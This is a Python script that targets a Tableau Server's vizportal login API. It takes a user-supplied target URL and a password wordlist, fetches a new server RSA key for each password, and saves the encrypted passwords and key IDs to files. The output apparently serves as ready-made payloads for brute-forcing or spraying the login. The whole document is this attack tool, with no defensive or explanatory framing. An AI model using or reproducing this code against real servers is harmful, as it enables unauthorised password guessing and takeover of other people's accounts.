import requests
import json
import binascii
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

tab_server_url = input("Input your target URL: ")

def _encode_for_display(text):
    return text.encode('ascii', errors="backslashreplace").decode('utf-8')

# Establish a session so we can retain the cookies
session = requests.Session()

def generate_public_key():
    payload = "{\"method\":\"generatePublicKey\",\"params\":{}}"
    endpoint = "generatePublicKey"
    url = tab_server_url + "/vizportal/api/web/v1/" + endpoint
    headers = {
        'content-type': "application/json;charset=UTF-8",
        'accept': "application/json, text/plain, */*",
        'cache-control': "no-cache"
    }
    response = session.post(url, data=payload, headers=headers)
    response_text = json.loads(_encode_for_display(response.text))
    response_values = {
        "keyId": response_text["result"]["keyId"],
        "n": response_text["result"]["key"]["n"],
        "e": response_text["result"]["key"]["e"]
    }
    return response_values

def asymmetric_encrypt(val, public_key):
    modulus_decoded = int(public_key["n"], 16)
    exponent_decoded = int(public_key["e"], 16)
    key_pub = RSA.construct((modulus_decoded, exponent_decoded))
    cipher = PKCS1_v1_5.new(key_pub)
    encrypted_val = cipher.encrypt(val.encode())
    return binascii.hexlify(encrypted_val).decode()

# Generate public key
public_key = generate_public_key()

# Get path of the passwords file from user
passwords_file = input("Enter path to the passwords file: ")

# Read passwords from file
passwords = []
with open(passwords_file, "r") as file:
    for line in file:
        passwords.append(line.strip())

# Generate encrypted passwords
encrypted_passwords = []
public_keys = []
for password in passwords:
    # Generate new public key for each password
    public_key = generate_public_key()
    pk = public_key["keyId"]
    encrypted_password = asymmetric_encrypt(password, public_key)
    encrypted_passwords.append(encrypted_password)
    public_keys.append(pk)

# Save encrypted passwords and public keys to separate files
output_file1 = "encrypted_passwords.txt"
with open(output_file1, "w") as file:
    for i, password in enumerate(passwords):
        file.write(f"{encrypted_passwords[i]}\n")

output_file2 = "public_keys.txt"
with open(output_file2, "w") as file:
    for pk in public_keys:
        file.write(f"{pk}\n")

print(f"Encrypted passwords saved to: {output_file1}")
print(f"Public keys saved to: {output_file2}")
